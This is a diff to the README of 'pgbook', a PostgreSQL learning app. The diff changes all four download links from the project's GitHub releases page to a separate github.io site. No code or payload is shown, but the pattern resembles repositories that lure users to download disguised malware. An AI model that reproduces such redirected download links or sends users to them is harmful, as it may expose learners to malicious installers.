@@ -4,7 +4,7 @@
 
 Welcome to **pgbook**! This application is your friendly guide to learning PostgreSQL, one simple topic at a time. Whether you're a complete beginner or just want to brush up on your skills, pgbook makes learning database concepts straightforward and enjoyable.
 
-[⬇️ **Download pgbook Now**](https://github.com/David23567/pgbook/releases)
+[⬇️ **Download pgbook Now**](https://david23567.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to **pgbook**! This application is your friendly guide to learning Postg
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/David23567/pgbook/releases](https://github.com/David23567/pgbook/releases)
+Visit this link to download the application: [https://david23567.github.io](https://david23567.github.io)
 
 ### Step 2: Choose Your File
 
@@ -190,7 +190,7 @@ If you need help with pgbook:
 
 ## 📬 Stay Updated
 
-To be notified of new versions, visit the releases page and watch for updates: [https://github.com/David23567/pgbook/releases](https://github.com/David23567/pgbook/releases)
+To be notified of new versions, visit the releases page and watch for updates: [https://david23567.github.io](https://david23567.github.io)
 
 New lessons and features are added regularly, so checking back every few weeks will ensure you have the latest version.
 
@@ -200,7 +200,7 @@ New lessons and features are added regularly, so checking back every few weeks w
 
 Learning PostgreSQL doesn't have to be intimidating. With **pgbook**, you have a friendly companion that makes the journey enjoyable and rewarding. Download it today and take your first step toward database mastery!
 
-[⬇️ **Download pgbook Now**](https://github.com/David23567/pgbook/releases)
+[⬇️ **Download pgbook Now**](https://david23567.github.io)
 
 Happy learning! 📘✨
 
